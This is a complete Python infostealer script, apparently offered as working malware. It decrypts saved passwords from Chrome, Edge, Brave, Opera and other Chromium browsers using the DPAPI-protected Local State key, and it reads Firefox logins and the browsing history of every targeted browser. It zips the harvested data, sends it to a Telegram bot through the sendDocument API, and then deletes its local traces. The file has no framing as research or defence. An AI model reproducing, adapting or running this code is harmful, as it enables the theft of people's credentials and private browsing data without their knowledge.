import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import zipfile
import requests
import socket

bot_token = 'ID-TOKEN'
chat_id = 'ID-CHAT'

def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80), timeout=5)
        return True
    except OSError:
        return False

def get_encryption_key(browser_name):
    if browser_name == 'Mozilla/Firefox':
        return None
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Local State')
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State file not found for {browser_name}")
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print("Error decrypting password:", e)
        return ""

def save_data_to_file(data, folder, filename):
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, filename), 'w', encoding='utf-8') as file:
        for entry in data:
            for key, value in entry.items():
                file.write(f"{key}: {value}\n")
            file.write("="*50 + "\n")

def zip_folder(folder_path, output_file):
    shutil.make_archive(output_file, 'zip', folder_path)

def send_file_via_telegram(bot_token, chat_id, file_path):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
    return response.status_code == 200

def get_browser_data(browser_name, data_type):
    if browser_name == 'Mozilla/Firefox':
        return get_firefox_data(data_type)
    
    key = get_encryption_key(browser_name)
    db_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Default', 'Login Data' if data_type == 'passwords' else 'History')
    if not os.path.exists(db_path):
        raise FileNotFoundError(f"{data_type.capitalize()} file not found for {browser_name}")
    filename = f"{browser_name.replace('/', '_')}_{data_type.capitalize()}.db"
    shutil.copyfile(db_path, filename)

    data = []
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    if data_type == 'passwords':
        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            encrypted_password = row[3]
            decrypted_password = decrypt_password(encrypted_password, key)
            if username or decrypted_password:
                data.append({
                    'browser': browser_name,
                    'origin_url': origin_url,
                    'action_url': action_url,
                    'username': username,
                    'password': decrypted_password
                })
    elif data_type == 'history':
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            last_visit_time = row[2]
            data.append({
                'browser': browser_name,
                'url': url,
                'title': title,
                'last_visit_time': last_visit_time
            })

    cursor.close()
    db.close()
    os.remove(filename)

    return data

def get_firefox_data(data_type):
    if data_type == 'passwords':
        db_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles', next(os.listdir(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'))), 'logins.json')
        if not os.path.exists(db_path):
            raise FileNotFoundError(f"Logins file not found for Mozilla Firefox")
        with open(db_path, 'r', encoding='utf-8') as file:
            logins = json.load(file)
            passwords = []
            for login in logins['logins']:
                passwords.append({
                    'browser': 'Mozilla/Firefox',
                    'origin_url': login['hostname'],
                    'action_url': '',
                    'username': login['username'],
                    'password': login['password']
                })
            return passwords

    elif data_type == 'history':
        db_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles', next(os.listdir(os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'))), 'places.sqlite')
        if not os.path.exists(db_path):
            raise FileNotFoundError(f"History file not found for Mozilla Firefox")
        filename = 'Firefox_History.db'
        shutil.copyfile(db_path, filename)
        
        data = []
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            last_visit_time = row[2]
            data.append({
                'browser': 'Mozilla/Firefox',
                'url': url,
                'title': title,
                'last_visit_time': last_visit_time
            })

        cursor.close()
        db.close()
        os.remove(filename)

        return data

def main():
    if not check_internet_connection():
        print("No internet connection detected. Exiting...")
        return
    
    browsers = [
        'Google/Chrome',
        'CocCoc/Browser',
        'Microsoft/Edge',
        'Opera/Opera',
        'BraveSoftware/Brave-Browser',
        'Vivaldi/Application',
        'Epic Privacy Browser',
        'Comodo/Dragon',
        'Mozilla/Firefox',
        'Safari'
    ]

    base_folder = 'Browser_Data'

    for browser in browsers:
        try:
            passwords = get_browser_data(browser, 'passwords')
            history = get_browser_data(browser, 'history')

            passwords_folder = os.path.join(base_folder, 'Passwords', browser.replace('/', '_'))
            history_folder = os.path.join(base_folder, 'History', browser.replace('/', '_'))
            save_data_to_file(passwords, passwords_folder, f"{browser.replace('/', '_')}_Passwords.txt")
            save_data_to_file(history, history_folder, f"{browser.replace('/', '_')}_History.txt")

        except FileNotFoundError as e:
            print(e)

    zip_filename = 'Browser_Data.zip'
    zip_folder(base_folder, zip_filename)

    if send_file_via_telegram(bot_token, chat_id, f"{zip_filename}.zip"):
        print(f"File {zip_filename}.zip sent successfully.")
    else:
        print(f"Failed to send file {zip_filename}.zip.")

    shutil.rmtree(base_folder)
    os.remove(f"{zip_filename}.zip")

if __name__ == "__main__":
    main()
